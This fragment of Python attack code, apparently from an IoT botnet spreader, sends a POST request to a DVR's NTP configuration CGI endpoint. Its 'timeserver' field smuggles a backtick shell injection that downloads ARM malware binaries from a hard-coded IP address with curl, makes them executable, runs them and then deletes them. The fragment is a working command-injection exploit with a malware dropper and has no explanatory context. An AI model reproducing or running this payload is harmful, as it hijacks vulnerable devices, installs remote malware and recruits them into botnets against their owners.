                ...
                if req.status_code == 200:
                    req = self.client.post(f"{self.ip}/cgi-bin/system_ntp.cgi",
                                           data={
                                               ...
                                               "synccheck": "1",
                                               "public": "0",
                                               "timeserver": "`rm -rf arm7; curl -O http://192.109.200.60/hiddenbin/Space.arm7;; chmod 777 arm7; ./arm7 korea.dvr; rm -rf arm7; rm -rf arm5; curl -O http://192.109.200.60/hiddenbin/Space.arm5; chmod 777 arm5; ./arm5 korea.dvr; rm -rf arm5; `",
                                               "interval": "60",
                                               "enableNTPServer": "1"
                                           })
